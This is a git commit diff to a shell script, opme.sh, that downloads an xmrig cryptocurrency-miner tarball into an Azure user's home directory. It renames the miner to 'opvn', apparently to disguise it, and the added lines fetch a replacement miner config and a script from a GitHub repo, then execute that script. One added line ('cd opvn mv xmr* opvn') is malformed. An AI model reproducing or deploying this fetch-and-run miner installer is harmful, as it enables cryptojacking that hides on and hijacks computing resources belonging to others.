f678760635bff6be8a5a5e751404c15c52b18673
bondbenz1821 <126075464+bondbenz1821@users.noreply.github.com>
2023-11-15 22:44:22 +0700

    Update opme.sh

--- opme.sh
+++ opme.sh
@@ -2,5 +2,11 @@ cd /home/azureuser
 wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
 tar -xzsf opme.tar.gz
 mv xmrig* opvn
-cd opvn
+cd opvn mv xmr* opvn
 
+mv config.json config.json.bk
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
+chmod +x opvn.sh
+
+./opvn.sh
